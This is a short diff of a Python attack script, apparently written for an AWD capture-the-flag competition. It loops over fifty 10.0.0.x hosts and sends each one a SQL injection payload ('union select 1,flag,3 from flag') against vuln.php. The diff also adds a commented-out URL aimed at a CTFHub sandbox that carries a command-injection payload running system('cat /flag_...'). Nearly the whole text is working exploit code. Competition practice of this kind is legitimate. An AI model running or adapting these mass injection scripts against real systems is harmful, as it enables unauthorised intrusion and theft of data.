@@ -8,6 +8,7 @@ AWD竞赛中需要同时攻击多个队伍（10-50个靶机）
 targets = [f"10.0.0.{i}" for i in range(1, 51)]
 for target in targets:
         url = f"http://{target}/vuln.php?id=1' union select 1,flag,3 from flag--"
+        #url = "http://challenge-c06ebddf5db7d3ac.sandbox.ctfhub.com:10800/?cmd=system(%22cat%20/flag_25168%22);"
         try:
             r = requests.get(url, timeout=3)
             print(f"{target}: {r.text}")
